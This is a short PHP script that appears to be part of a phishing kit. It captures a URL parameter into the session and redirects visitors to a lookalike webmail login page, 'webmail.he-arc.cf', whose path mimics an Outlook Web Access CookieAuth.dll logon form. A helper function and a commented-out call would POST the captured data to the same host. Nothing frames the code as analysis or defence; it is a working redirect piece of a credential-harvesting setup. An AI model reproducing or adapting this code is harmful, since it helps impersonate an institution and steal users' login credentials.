<?php

function redirect_post($url, array $data, array $headers = null) {
    $params = array(
        'http' => array(
            'method' => 'POST',
            'content' => http_build_query($data)
        )
    );
    if (!is_null($headers)) {
        $params['http']['header'] = '';
        foreach ($headers as $k => $v) {
            $params['http']['header'] .= "$k: $v\n";
        }
    }
    $ctx = stream_context_create($params);
    $fp = @fopen($url, 'rb', false, $ctx);
    if ($fp) {
        echo @stream_get_contents($fp);
        die();
    } else {
        // Error
        throw new Exception("Error loading '$url', $php_errormsg");
    }
}

if (!empty($_GET))
{
$surl= $_GET['SURL'];
$url = $_GET['URL'];
$data= array('url' => $url);
session_start();
$_SESSION["url"]=$url;
header( 'Location: http://webmail.he-arc.cf/CookieAuth.dll-GetLogon-curl=Z2F&reason=0&formdir=2.php' );
//redirect_post('http://webmail.he-arc.cf/owa/CookieAuth.dll-GetLogon-curl=Z2F&reason=0&formdir=2.php', $data, null);
}
else
{
header( 'Location: http://webmail.he-arc.cf/CookieAuth.dll-GetLogon-curl=Z2F&reason=0&formdir=2.html' );
}
?>